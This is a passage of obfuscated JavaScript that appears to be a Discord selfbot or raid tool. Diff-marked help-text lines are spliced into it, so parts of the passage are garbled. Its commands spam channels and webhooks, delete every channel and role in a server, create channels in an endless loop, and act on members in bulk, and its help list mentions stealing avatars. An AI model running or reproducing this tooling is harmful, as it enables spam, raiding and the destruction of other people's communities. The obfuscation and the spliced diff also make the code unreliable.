_0x1b369a[_0x1be328(0x49d,0x5d5)][_0x1be328(0x4c0,0x4f5)](_0x1be328(0x512,0x665)+_0x53acfd[_0x1be328(0x5c6,0x6c9)](',\x20'));if(!_0x1748bb[0x7*0x75+-0x115*-0x18+0x9b9*-0x3][_0x1be328(0x529,0x44d)]()===_0x53acfd)return _0x1b369a[_0x1be328(0x49d,0x5a2)][_0x1be328(0x4c0,0x4ae)](_0x1be328(0x512,0x423)+_0x53acfd[_0x1be328(0x5c6,0x593)](',\x20'));if(!_0x1748bb[_0x1be328(0x764,0x8ae)](0x714+0x36c+-0xa7f)[_0x1be328(0x5c6,0x4a8)]('\x20'))return _0x1b369a[_0x1be328(0x49d,0x404)][_0x1be328(0x4c0,0x604)](_0x1be328(0x4de,0x551));if(_0x1748bb[-0x1e8e+-0x3a9+0x2237*0x1][_0x1be328(0x529,0x5a4)]()===_0x53acfd[-0xd+-0x49*0x7d+0xbe6*0x3])_0x1b369a[_0x1be328(0x49d,0x392)][_0x1be328(0x4c0,0x5e3)]('**'+_0x1748bb[_0x1be328(0x764,0x7d2)](0x1*0x248e+-0x99f+0x1aee*-0x1)['join']('\x20')+'**');else{if(_0x1748bb[-0x353*-0xb+0x6b7+-0x2b48][_0x1be328(0x529,0x447)]()===_0x53acfd[-0x1be9+-0x7f*0x37+0x3733])_0x1b369a[_0x1be328(0x49d,0x56d)][_0x1be328(0x4c0,0x5e9)]('*'+_0x1748bb[_0x1be328(0x764,0x724)](0xd25+0x204f+-0x917*0x5)[_0x1be328(0x5c6,0x653)]('\x20')+'*');else{if(_0x1748bb[0x17*-0x8e+0x904+0x3be][_0x1be328(0x529,0x425)]()===_0x53acfd[0x16df*0x1+0x1314+-0x29f1*0x1])_0x1b369a[_0x1be328(0x49d,0x34d)][_0x1be328(0x4c0,0x3bb)]('__'+_0x1748bb[_0x1be328(0x764,0x78f)](0x1fad+-0x1d35+-0x277)[_0x1be328(0x5c6,0x740)]('\x20')+'__');else{if(_0x1748bb[-0xdaa+-0x8ce+0x1678][_0x1be328(0x529,0x475)]()===_0x53acfd[0x9b*-0x1f+-0x1120+0x2*0x11f4])_0x1b369a[_0x1be328(0x49d,0x399)][_0x1be328(0x4c0,0x3d3)](colors[_0x1be328(0x5fc,0x5e2)](_0x1748bb[_0x1be328(0x764,0x5f8)](-0xff9+0x1fad+0x1*-0xfb3)[_0x1be328(0x5c6,0x4b7)]('\x20')));else{if(_0x1748bb[-0x228d+0xea+-0x6d*-0x4f][_0x1be328(0x529,0x6b3)]()===_0x53acfd[0x52*0xd+0x249*0x7+-0x6b7*0x3])_0x1b369a[_0x1be328(0x49d,0x541)][_0x1be328(0x4c0,0x508)](_0x1748bb[_0x1be328(0x764,0x656)](0xd91*-0x1+0x3*-0x1c1+0x12d5)[_0x1be328(0x5c6,0x4e5)]('\x20')[_0x1be328(0x4e1,0x4a0)]());else{if(_0x1748bb[-0x25*0x2f+0x92f*0x1+0x44*-0x9][_0x1be328(0x529,0x3c9)]()===_0x53acfd[0x1*-0xabb+-0x717+-0x1*-0x11d7])_0x1b369a[_0x1be328(0x49d,0x4af)][_0x1be328(0x4c0,0x37b)](_0x1748bb[_0x1be328(0x764,0x74b)](-0x1020+0xd52+0x2cf)[_0x1be328(0x5c6,0x522)]('\x20')[_0x1be328(0x529,0x6b7)]());else{if(_0x1748bb[-0x1*0xb5+0x1aaf+-0x19fa][_0x1be328(0x529,0x48b)]()===_0x53acfd[-0xf05*-0x1+-0x5*0x515+-0x1*-0xa6a])_0x1b369a[_0x1be328(0x49d,0x380)]['send']('~~'+_0x1748bb[_0x1be328(0x764,0x899)](-0x8cc+0x1*-0x22bd+0x2*0x15c5)[_0x1be328(0x5c6,0x529)]('\x20')+'~~');else{if(_0x1748bb[-0x1*0x10bf+0x2473+-0xd*0x184][_0x1be328(0x529,0x484)]()===_0x53acfd[0x69*-0xd+0x1*-0x2582+0x3e*0xb1])_0x1b369a[_0x1be328(0x49d,0x4d5)][_0x1be328(0x4c0,0x4c5)]('||'+_0x1748bb[_0x1be328(0x764,0x6a8)](0x8f*0xb+-0x1d5a+0x1736)[_0x1be328(0x5c6,0x58f)]('\x20')+'||');else _0x1748bb[-0x1e37+-0x1*-0x1557+0x2*0x470][_0x1be328(0x529,0x4ee)]()===_0x53acfd[0x4*0x1f+-0x5*-0x1db+0x2f*-0x35]&&_0x1b369a[_0x1be328(0x49d,0x3d0)][_0x1be328(0x4c0,0x38b)](_0x1be328(0x57e,0x42d)+colors[_0x1be328(0x5fc,0x68c)](_0x1748bb[_0x1be328(0x764,0x8db)](0xf5a+0x1d7d+-0x1*0x2cd6)[_0x1be328(0x5c6,0x5be)]('\x20')[_0x1be328(0x4e1,0x66b)]())+_0x1be328(0x6ef,0x824));}}}}}}}}if(_0x390a85===_0x1be328(0x50c,0x512)){console['log']('['+colors[_0x1be328(0x57b,0x6cd)](moment()[_0x1be328(0x4bf,0x3b4)]()[_0x1be328(0x6ed,0x7a6)](_0x1be328(0x5fa,0x70d)))+']\x20'+colors['cyan'](_0x1be328(0x596,0x58d))+'\x20'+colors[_0x1be328(0x5db,0x583)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x46d)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x56b)]&&_0x1b369a['delete']();if(!_0x1748bb[-0x1797+-0x43*-0x3d+-0x4*-0x1e8]||!/\d{1,2}/ig[_0x1be328(0x4b6,0x51d)](_0x1748bb[-0xef5+-0x10*0x169+0x2585]))return _0x1b369a[_0x1be328(0x49d,0x4d6)][_0x1be328(0x4c0,0x4b0)](_0x1be328(0x4d0,0x61e));else var _0x4188a9=_0x1748bb[-0xa4*-0x37+-0x247f*0x1+0x143];if(!_0x1748bb[-0x8a0+0x1587*-0x1+-0x14*-0x182])return _0x1b369a[_0x1be328(0x49d,0x4bd)][_0x1be328(0x4c0,0x5a7)](_0x1be328(0x4de,0x401));else{_0x1748bb[_0x1be328(0x611,0x51f)](-0x1504+0x1c4c+-0x748,-0x100f+-0x2*0x130e+0x362c);var _0x32f732=_0x1748bb[_0x1be328(0x5c6,0x43f)]('\x20');}for(var _0x4ccc9c=-0xffb+0x3*-0xa07+0x2e10;_0x4ccc9c<_0x4188a9;_0x4ccc9c++){_0x1b369a[_0x1be328(0x49d,0x4c9)][_0x1be328(0x4c0,0x642)](_0x32f732);}}if(_0x390a85===_0x1be328(0x560,0x5bc)){console[_0x1be328(0x6da,0x606)]('['+colors[_0x1be328(0x57b,0x604)](moment()[_0x1be328(0x4bf,0x4fe)]()['format'](_0x1be328(0x5fa,0x54c)))+']\x20'+colors[_0x1be328(0x632,0x784)]('Command\x20used')+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x4cd)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x80e)]&&_0x1b369a[_0x1be328(0x594,0x4fa)]();const _0x5110d5=_0x1b369a[_0x1be328(0x4d3,0x4b3)][_0x1be328(0x665,0x611)][_0x1be328(0x6a5,0x836)]();if(!_0x5110d5)return _0x1b369a[_0x1be328(0x49d,0x60d)][_0x1be328(0x4c0,0x378)](_0x1be328(0x685,0x7ee));const _0x559f7b=_0x1748bb[_0x1be328(0x764,0x5f7)](-0x2*0x85a+0xd*-0x23b+0x2db4)[_0x1be328(0x5c6,0x4ba)]('\x20');if(!_0x559f7b)return _0x1b369a[_0x1be328(0x49d,0x57b)][_0x1be328(0x4c0,0x418)](_0x1be328(0x54c,0x3d9));for(var _0x4ccc9c=-0x2704+-0x1*0xde7+0x13*0x2c9;_0x4ccc9c<_0x559f7b;_0x4ccc9c++){_0x5110d5[_0x1be328(0x4c0,0x37e)](_0x1be328(0x615,0x48b));}}if(_0x390a85===_0x1be328(0x63a,0x66c)){console[_0x1be328(0x6da,0x7de)]('['+colors[_0x1be328(0x57b,0x5fa)](moment()['utc']()[_0x1be328(0x6ed,0x78e)](_0x1be328(0x5fa,0x77d)))+']\x20'+colors[_0x1be328(0x632,0x660)](_0x1be328(0x596,0x6fa))+'\x20'+colors[_0x1be328(0x5db,0x568)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x690)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x779)]&&_0x1b369a[_0x1be328(0x594,0x58a)]();if(!_0x1748bb[-0x1818*0x1+-0xf2d*-0x1+0x8eb])return _0x1b369a[_0x1be328(0x49d,0x370)]['send'](_0x1be328(0x618,0x70f));const _0x6d981e=_0x1748bb[-0x7c*-0x28+0x1adb+0x2d*-0x107];function _0x4efa76(){const _0x2d23bd=function(_0x3228d4,_0xc33e11){return _0x1be328(_0x3228d4- -0x280,_0xc33e11);};let _0x3896f2='',_0x5b761f=_0x2d23bd(0x321,0x1b9);for(var _0x2c0943=0xe4*-0xb+-0xf6c+0x1938;_0x2c0943<-0xecc+0x7d6+0x709;_0x2c0943++){_0x3896f2=_0x3896f2+_0x5b761f[_0x2d23bd(0x313,0x385)](Math[_0x2d23bd(0x247,0x254)](Math[_0x2d23bd(0x2d2,0x424)]()*_0x5b761f[_0x2d23bd(0x2b7,0x30a)]));}return _0x3896f2;}for(var _0x4ccc9c=0x249c+-0x3*-0xafd+-0x4593;_0x4ccc9c<_0x6d981e;_0x4ccc9c++){_0x1b369a[_0x1be328(0x49d,0x540)][_0x1be328(0x4c0,0x5b6)](_0x1be328(0x75c,0x6d1)+_0x4efa76());}}if(_0x390a85===_0x1be328(0x693,0x5de)){console[_0x1be328(0x6da,0x585)]('['+colors[_0x1be328(0x57b,0x456)](moment()[_0x1be328(0x4bf,0x3e9)]()['format'](_0x1be328(0x5fa,0x4ed)))+']\x20'+colors[_0x1be328(0x632,0x549)](_0x1be328(0x596,0x69c))+'\x20'+colors[_0x1be328(0x5db,0x693)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x76a)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6a9)]&&_0x1b369a[_0x1be328(0x594,0x436)]();if(!config[_0x1be328(0x78b,0x8bc)])return console[_0x1be328(0x6da,0x566)](colors['red'](_0x1be328(0x49b,0x3c8))+'\x20'+colors[_0x1be328(0x5f5,0x64f)](_0x1be328(0x75d,0x5e2)));const _0x381a1e=_0x1748bb[0x112f+-0x829*0x4+0xf75],_0x1951db=_0x1748bb[_0x1be328(0x764,0x844)](-0x1b10*0x1+-0x6a2*-0x5+0x7*-0xdf)[_0x1be328(0x5c6,0x503)]('\x20');if(!_0x381a1e)return _0x1b369a[_0x1be328(0x49d,0x5dd)][_0x1be328(0x4c0,0x533)](_0x1be328(0x746,0x6b3));if(!_0x1951db)return _0x1b369a[_0x1be328(0x49d,0x3b7)][_0x1be328(0x4c0,0x3a1)](_0x1be328(0x708,0x73c));if(('['+_0x1b369a[_0x1be328(0x59c,0x6ca)][_0x1be328(0x629,0x4b5)]+']\x20'+_0x1b369a[_0x1be328(0x59c,0x6ed)][_0x1be328(0x5e0,0x520)])[_0x1be328(0x537,0x451)]>0x168e*-0x1+0xc5c+0xa5a)return console[_0x1be328(0x6da,0x7b4)](colors['red'](_0x1be328(0x49b,0x3c7))+'\x20'+colors[_0x1be328(0x5f5,0x756)](_0x1be328(0x6c4,0x6e1)));const _0x156ae3=new webhook[(_0x1be328(0x701,0x7d1))](config[_0x1be328(0x78b,0x665)]);for(var _0x4ccc9c=0x1925+0xa9*0x28+-0x338d;_0x4ccc9c<_0x381a1e;_0x4ccc9c++){const _0x29a5a5=new webhook[(_0x1be328(0x52c,0x3e8))]()[_0x1be328(0x666,0x797)]('['+_0x1b369a[_0x1be328(0x59c,0x4d4)][_0x1be328(0x629,0x6be)]+']\x20'+_0x1b369a[_0x1be328(0x59c,0x443)][_0x1be328(0x5e0,0x510)])[_0x1be328(0x60f,0x66d)](_0x1b369a['guild'][_0x1be328(0x50b,0x430)])[_0x1be328(0x482,0x377)](_0x1be328(0x699,0x754))[_0x1be328(0x4a2,0x51d)](_0x1be328(0x636,0x58f))[_0x1be328(0x5d3,0x47c)](image?image:_0x1be328(0x793,0x901))[_0x1be328(0x5aa,0x6c3)](color?color:_0x1be328(0x4c1,0x4c9))[_0x1be328(0x69b,0x823)](footer?footer:_0x1be328(0x524,0x61a))[_0x1be328(0x76c,0x766)](_0x1951db);_0x156ae3[_0x1be328(0x4c0,0x33f)](_0x29a5a5);}}if(_0x390a85==='webhookspam'){console[_0x1be328(0x6da,0x5c5)]('['+colors[_0x1be328(0x57b,0x50b)](moment()[_0x1be328(0x4bf,0x504)]()[_0x1be328(0x6ed,0x6e5)](_0x1be328(0x5fa,0x605)))+']\x20'+colors[_0x1be328(0x632,0x6e4)](_0x1be328(0x596,0x65c))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x739)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x692)]&&_0x1b369a[_0x1be328(0x594,0x50c)]();let _0x3e883b;const _0x18c03a=_0x1748bb[0x2*0x8ac+-0x1*0x1867+-0x70f*-0x1],_0x4ea118=_0x1748bb[-0x9*-0x1c8+-0x1f7*-0x2+-0x13f5];if(!_0x4ea118==_0x1be328(0x4d2,0x4aa)||!_0x4ea118==_0x1be328(0x718,0x746))return _0x1b369a[_0x1be328(0x49d,0x351)][_0x1be328(0x4c0,0x458)](_0x1be328(0x6c9,0x5e1));if(_0x4ea118===_0x1be328(0x4d2,0x392))_0x3e883b=_0x1be328(0x6be,0x603)+_0x1748bb[_0x1be328(0x764,0x8c7)](0x1ccf+-0x20*0x8d+0x1*-0xb2d)[_0x1be328(0x5c6,0x53f)]('\x20');if(_0x4ea118==='false')_0x3e883b=_0x1748bb[_0x1be328(0x764,0x820)](-0x13*0x10f+0x1b16*0x1+-0x6f7)[_0x1be328(0x5c6,0x4f2)]('\x20');if(!_0x18c03a[_0x1be328(0x678,0x701)](_0x1be328(0x4fb,0x475)))return _0x1b369a[_0x1be328(0x49d,0x4a5)][_0x1be328(0x4c0,0x3d0)](_0x1be328(0x6b8,0x5ea));const _0x58e65f=new webhook[(_0x1be328(0x701,0x6cf))](_0x18c03a);for(var _0x4ccc9c=-0x1f06+-0x2122+-0x1*-0x4028;_0x4ccc9c<0x842*0x3+-0x76*-0x52+-0x3e2e;_0x4ccc9c++){const _0x47eb47=new webhook['MessageBuilder']()[_0x1be328(0x482,0x485)](_0x3e883b)[_0x1be328(0x666,0x6f9)](_0x1be328(0x5c3,0x603));_0x58e65f['send'](_0x47eb47);}}if(_0x390a85==='whois'){console[_0x1be328(0x6da,0x627)]('['+colors[_0x1be328(0x57b,0x425)](moment()[_0x1be328(0x4bf,0x4c6)]()[_0x1be328(0x6ed,0x631)](_0x1be328(0x5fa,0x51a)))+']\x20'+colors[_0x1be328(0x632,0x515)](_0x1be328(0x596,0x53f))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x6a1)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x805)]&&_0x1b369a[_0x1be328(0x594,0x687)]();if(!_0x1b369a[_0x1be328(0x59c,0x443)])return _0x1b369a[_0x1be328(0x5f7,0x652)][_0x1be328(0x4c0,0x493)]('This\x20command\x20cannot\x20be\x20executed\x20in\x20Direct\x20Messages\x20or\x20in\x20Private\x20Groups.');const _0x36cbcb=_0x1b369a[_0x1be328(0x4d3,0x4a8)][_0x1be328(0x665,0x7e3)][_0x1be328(0x6a5,0x6e7)]()||_0x1b369a[_0x1be328(0x5f7,0x749)],_0x86c1d6=_0x1b369a[_0x1be328(0x59c,0x666)][_0x1be328(0x6bd,0x665)](_0x36cbcb),_0x20454d=_0x86c1d6[_0x1be328(0x785,0x602)][_0x1be328(0x648,0x734)]()[_0x1be328(0x6c1,0x758)](_0x4c4644=>_0x4c4644[_0x1be328(0x4b4,0x40e)](/_/g,'\x20')[_0x1be328(0x529,0x675)]()[_0x1be328(0x4b4,0x55a)](/\b(\w)/g,_0x4a3a7b=>_0x4a3a7b[_0x1be328(0x4e1,0x387)]()))[_0x1be328(0x5c6,0x745)](',\x20'),_0x56d559=_0x86c1d6[_0x1be328(0x5e7,0x4a0)][_0x1be328(0x6c1,0x6a4)](_0x4e254d=>_0x4e254d)['join'](',\x20');if(enabled===!![]){let _0x164aa0=new Discord[(_0x1be328(0x508,0x587))]()[_0x1be328(0x4a2,0x3b8)](_0x36cbcb[_0x1be328(0x5fb,0x4b3)]+_0x1be328(0x76a,0x668))[_0x1be328(0x76c,0x81d)](_0x1be328(0x69c,0x628)+_0x36cbcb[_0x1be328(0x6ba,0x76b)])[_0x1be328(0x5d3,0x538)](_0x36cbcb[_0x1be328(0x5d4,0x668)])[_0x1be328(0x5aa,0x48e)](_0x86c1d6[_0x1be328(0x660,0x77f)][_0x1be328(0x493,0x554)]||_0x1be328(0x599,0x61b))[_0x1be328(0x51a,0x455)]('Username',_0x36cbcb[_0x1be328(0x5fb,0x649)],!![])[_0x1be328(0x51a,0x66c)](_0x1be328(0x645,0x687),_0x36cbcb['discriminator'],!![])['addField']('ID',_0x36cbcb['id'],!![])[_0x1be328(0x51a,0x523)](_0x1be328(0x65e,0x598),moment(_0x36cbcb[_0x1be328(0x4ff,0x559)])[_0x1be328(0x6ed,0x863)](_0x1be328(0x6a0,0x810)),!![])[_0x1be328(0x51a,0x48b)]('['+_0x86c1d6[_0x1be328(0x5e7,0x658)][_0x1be328(0x489,0x431)]+_0x1be328(0x788,0x848),_0x56d559)[_0x1be328(0x51a,0x5a9)](_0x1be328(0x52e,0x64f),_0x20454d)[_0x1be328(0x69b,0x60e)](footer?footer:_0x1be328(0x524,0x3e6))[_0x1be328(0x56f,0x4d2)]();_0x1b369a[_0x1be328(0x49d,0x350)][_0x1be328(0x4c0,0x40b)](_0x164aa0);}else _0x1b369a['channel'][_0x1be328(0x4c0,0x37a)](stripIndents`\`\`\`
-            ${_0x36cbcb[_0x1be328(0x5fb,0x6de)]} Info
-            Here is some information on ${_0x36cbcb[_0x1be328(0x6ba,0x585)]}
+      ${prefix}copy <user> » Sets your username and avatar as the mentioned users avatar
+      ${prefix}invisible » Sets your username and avatar as something invisible
+      ${prefix}read » Marks every server that you are in as read
+      ${prefix}stealallpfp » Gets everyones avatar and saves it into a json file on your desktop [GUILD ONLY]
+      ${prefix}stealpfp <user> » Sets your avatar as the mentioned users avatar${footer ? `\n\n${footer}` : null}
+      \`\`\``)
+    }
+  }
 
-            Username: ${_0x36cbcb[_0x1be328(0x5fb,0x6a0)]}
-            Discriminator: ${_0x36cbcb[_0x1be328(0x707,0x7f8)]}
-            ID: ${_0x36cbcb['id']}
-            Account Created: ${moment(_0x36cbcb[_0x1be328(0x4ff,0x3ed)])[_0x1be328(0x6ed,0x861)](_0x1be328(0x6a0,0x686))}
-            Total Roles: ${_0x86c1d6[_0x1be328(0x5e7,0x724)][_0x1be328(0x489,0x2f7)]}
-            Guild Permissions: ${_0x20454d}${footer?'\x0a\x0a'+footer:null}
-            \`\`\``);}if(_0x390a85===_0x1be328(0x51c,0x5b6)){console[_0x1be328(0x6da,0x74d)]('['+colors[_0x1be328(0x57b,0x4ff)](moment()[_0x1be328(0x4bf,0x3a9)]()[_0x1be328(0x6ed,0x880)](_0x1be328(0x5fa,0x6b6)))+']\x20'+colors[_0x1be328(0x632,0x4cf)](_0x1be328(0x596,0x6bf))+'\x20'+colors[_0x1be328(0x5db,0x699)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x54a)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x64e)]&&_0x1b369a[_0x1be328(0x594,0x5d5)]();var _0x29eb3e=bot[_0x1be328(0x51c,0x4c0)],_0x131a02=Math[_0x1be328(0x4c7,0x60d)](_0x29eb3e/(-0x1*-0xa97+0x3ea+-0xa99)%(0x2f*-0x27+-0x4*-0x5a7+0x5*-0x30b)),_0x297e4f=Math[_0x1be328(0x4c7,0x588)](_0x29eb3e/(0x143f+-0x94a+-0x70d)/(-0x26e3+-0x1c1*-0x2+-0x3f5*-0x9)%(0x207a+0x35c+0x6*-0x5ef)),_0x35b19e=Math[_0x1be328(0x4c7,0x3e3)](_0x29eb3e/(0x1542+-0x17ba+0x10*0x66)/(-0xeee+0x152+0xdd8)/(-0x1269+-0x228b+0xb8*0x4a)%(-0x6*-0xe2+-0x1*-0x1993+-0x1ec7)),_0x94610=Math[_0x1be328(0x4c7,0x408)](_0x29eb3e/(-0x128f*0x1+-0x337*-0x2+0x1*0x1009)/(0x1041+-0x29*-0xed+-0x35fa)/(-0x19*0x29+-0x2019+0x2456*0x1)/(0xf88+0x1*-0x827+-0x749)%(-0x1773+0xbca+0xbb0)),_0x328046=Math[_0x1be328(0x4c7,0x375)](_0x29eb3e/(0x847*-0x4+-0xec3+0xb*0x4b5)/(0x553*0x2+-0x1eb*0x1+-0x1b3*0x5)/(-0x11*-0x110+0x601*-0x1+-0xbd3)/(-0x22a5+0x10ea+0x1b*0xa9)/(-0x1*-0x228a+0x144*-0xa+-0x153a)>>-0x3*-0x75f+-0x1a25+0x408),_0x5ecda2=null,_0x2e56be=null,_0x1fb900=null,_0x171a7c=null,_0x1182be=null;_0x131a02===0x7*-0x4a+-0x1b66+-0x117*-0x1b?_0x5ecda2=_0x1be328(0x5e4,0x465):_0x5ecda2=_0x1be328(0x689,0x5c6);_0x297e4f===0x5*0x5f3+-0x5ee*-0x1+0x6*-0x5f2?_0x2e56be=_0x1be328(0x587,0x5c8):_0x2e56be=_0x1be328(0x4b3,0x533);_0x35b19e===0x23*-0xb5+-0x254e+-0x4c6*-0xd?_0x1fb900=_0x1be328(0x676,0x6d0):_0x1fb900=_0x1be328(0x487,0x3bd);_0x94610===-0x2d6+-0x76f*-0x2+-0xc07?_0x171a7c=_0x1be328(0x5be,0x4c3):_0x171a7c='\x20days,\x20';_0x328046===-0x15ef*-0x1+0x1477+-0x2a65?_0x1182be=_0x1be328(0x4a8,0x600):_0x1182be=_0x1be328(0x50f,0x57e);_0x131a02===-0x18f8+0x1322+0x5d6&&(_0x131a02=null,_0x5ecda2=null);_0x297e4f===0x257b+-0x1*0x1421+0x8ad*-0x2&&(_0x297e4f=null,_0x2e56be=null);_0x35b19e===0xb5e+-0x2a2*0x1+-0x8bc&&(_0x35b19e=null,_0x1fb900=null);_0x94610===0x126f+0x4*-0x6f0+-0x9f*-0xf&&(_0x94610=null,_0x171a7c=null);_0x328046===0x1*0x14e3+0x169d*0x1+0x1*-0x2b80&&(_0x328046=null,_0x1182be=null);var _0x10f5d4=_0x328046+_0x1182be+_0x94610+_0x171a7c+_0x35b19e+_0x1fb900+_0x297e4f+_0x2e56be+_0x131a02+_0x5ecda2;let _0x3b03ce=new Discord[(_0x1be328(0x508,0x4c8))]()[_0x1be328(0x4a2,0x371)](_0x1be328(0x6b7,0x6aa))[_0x1be328(0x51a,0x66f)](_0x1be328(0x601,0x475),_0x10f5d4+_0x1be328(0x569,0x640)+moment()[_0x1be328(0x62d,0x535)](bot[_0x1be328(0x51c,0x62f)],'ms')[_0x1be328(0x6ed,0x83a)](_0x1be328(0x69e,0x577)))[_0x1be328(0x5d3,0x458)](image?image:'https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif')[_0x1be328(0x5aa,0x682)](color?color:_0x1be328(0x4c1,0x43e))[_0x1be328(0x69b,0x5a8)](footer?footer:_0x1be328(0x524,0x516));_0x1b369a[_0x1be328(0x49d,0x5bb)]['send'](_0x3b03ce);}if(_0x390a85===_0x1be328(0x54f,0x4dc)){console[_0x1be328(0x6da,0x6b5)]('['+colors[_0x1be328(0x57b,0x41b)](moment()[_0x1be328(0x4bf,0x41e)]()[_0x1be328(0x6ed,0x82d)](_0x1be328(0x5fa,0x775)))+']\x20'+colors[_0x1be328(0x632,0x4a7)](_0x1be328(0x596,0x528))+'\x20'+colors[_0x1be328(0x5db,0x751)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x584)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6af)]&&_0x1b369a[_0x1be328(0x594,0x55c)]();if(!_0x1b369a[_0x1be328(0x59c,0x4f4)]['me'][_0x1be328(0x696,0x668)](_0x1be328(0x536,0x590)))return console[_0x1be328(0x6da,0x781)](colors[_0x1be328(0x72e,0x816)](_0x1be328(0x5a4,0x6b9))+'\x20'+colors[_0x1be328(0x5f5,0x522)](_0x1be328(0x589,0x62c)));_0x1b369a[_0x1be328(0x59c,0x52c)][_0x1be328(0x4bc,0x4f9)][_0x1be328(0x787,0x732)](_0x5be2d9=>{const _0x1ed8aa=function(_0x5ebadc,_0x16548f){return _0x1be328(_0x16548f- -0x310,_0x5ebadc);};_0x5be2d9[_0x1ed8aa(0x126,0x284)]();});}if(_0x390a85===_0x1be328(0x61e,0x56c)){console[_0x1be328(0x6da,0x6a2)]('['+colors['green'](moment()[_0x1be328(0x4bf,0x436)]()[_0x1be328(0x6ed,0x58a)](_0x1be328(0x5fa,0x50a)))+']\x20'+colors[_0x1be328(0x632,0x6bc)](_0x1be328(0x596,0x710))+'\x20'+colors[_0x1be328(0x5db,0x73a)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x764)]&&_0x1b369a[_0x1be328(0x594,0x444)]();if(!_0x1b369a[_0x1be328(0x59c,0x6ed)]['me'][_0x1be328(0x696,0x5e3)](_0x1be328(0x526,0x4d6)))return console['log'](colors[_0x1be328(0x72e,0x88b)](_0x1be328(0x5a4,0x712))+'\x20'+colors[_0x1be328(0x5f5,0x67b)]('Missing\x20Permissions'));_0x1b369a[_0x1be328(0x59c,0x512)]['roles'][_0x1be328(0x787,0x72f)](_0x25e8ee=>{const _0x2a98a9=function(_0x584e5c,_0x1817ff){return _0x1be328(_0x584e5c- -0x4f,_0x1817ff);};_0x25e8ee[_0x2a98a9(0x545,0x5cf)]();});}if(_0x390a85==='masschannels'){console[_0x1be328(0x6da,0x7b5)]('['+colors[_0x1be328(0x57b,0x57b)](moment()[_0x1be328(0x4bf,0x4c0)]()[_0x1be328(0x6ed,0x5d2)](_0x1be328(0x5fa,0x6a1)))+']\x20'+colors[_0x1be328(0x632,0x715)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x4c8)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x60f)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6fb)]&&_0x1b369a[_0x1be328(0x594,0x48a)]();if(!_0x1b369a[_0x1be328(0x59c,0x67a)]['me'][_0x1be328(0x696,0x6cf)](_0x1be328(0x536,0x5ef)))return console[_0x1be328(0x6da,0x725)](colors[_0x1be328(0x72e,0x87e)](_0x1be328(0x5a4,0x638))+'\x20'+colors[_0x1be328(0x5f5,0x5c0)](_0x1be328(0x589,0x698)));setInterval(()=>{const _0x30d072=function(_0x547407,_0x3f7d02){return _0x1be328(_0x3f7d02- -0x334,_0x547407);},_0x41978e={};_0x41978e['type']=_0x30d072(0x241,0x212),_0x1b369a['guild'][_0x30d072(0x388,0x2f3)](_0x30d072(0x406,0x44b),_0x41978e);});}if(_0x390a85===_0x1be328(0x585,0x525)){console[_0x1be328(0x6da,0x74d)]('['+colors[_0x1be328(0x57b,0x61b)](moment()[_0x1be328(0x4bf,0x47a)]()['format'](_0x1be328(0x5fa,0x719)))+']\x20'+colors[_0x1be328(0x632,0x7a7)](_0x1be328(0x596,0x471))+'\x20'+colors[_0x1be328(0x5db,0x579)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4db)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x797)]&&_0x1b369a[_0x1be328(0x594,0x4b4)]();if(!_0x1b369a[_0x1be328(0x59c,0x6a6)]['me'][_0x1be328(0x696,0x681)](_0x1be328(0x796,0x906)))return console[_0x1be328(0x6da,0x760)](colors['red'](_0x1be328(0x5a4,0x597))+'\x20'+colors[_0x1be328(0x5f5,0x621)](_0x1be328(0x589,0x515)));_0x1b369a[_0x1be328(0x59c,0x453)][_0x1be328(0x59a,0x486)][_0x1be328(0x787,0x87a)](_0x1052ae=>{const _0x589d76=function(_0x3da728,_0x232381){return _0x1be328(_0x232381-0x226,_0x3da728);},_0x4c7ea6={};_0x4c7ea6[_0x589d76(0x8e2,0x9c7)]=_0x589d76(0x76b,0x7b1),_0x1052ae[_0x589d76(0x7cb,0x899)](_0x4c7ea6);});}if(_0x390a85===_0x1be328(0x6b3,0x689)){console[_0x1be328(0x6da,0x7ab)]('['+colors[_0x1be328(0x57b,0x5e1)](moment()[_0x1be328(0x4bf,0x5a5)]()[_0x1be328(0x6ed,0x62a)](_0x1be328(0x5fa,0x519)))+']\x20'+colors[_0x1be328(0x632,0x571)](_0x1be328(0x596,0x67a))+'\x20'+colors['magenta']('|')+'\x20'+colors[_0x1be328(0x5f5,0x766)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x6e1)]&&_0x1b369a[_0x1be328(0x594,0x642)]();if(!_0x1b369a[_0x1be328(0x59c,0x66a)]['me'][_0x1be328(0x696,0x5e5)](_0x1be328(0x770,0x890)))return console[_0x1be328(0x6da,0x747)](colors[_0x1be328(0x72e,0x74a)](_0x1be328(0x5a4,0x4b0))+'\x20'+colors['yellow'](_0x1be328(0x589,0x6d6)));_0x1b369a[_0x1be328(0x59c,0x5f1)][_0x1be328(0x59a,0x44d)][_0x1be328(0x787,0x8bf)](_0x13ca04=>{const _0x12d5d2=function(_0x50795e,_0x413afd){return _0x1be328(_0x50795e- 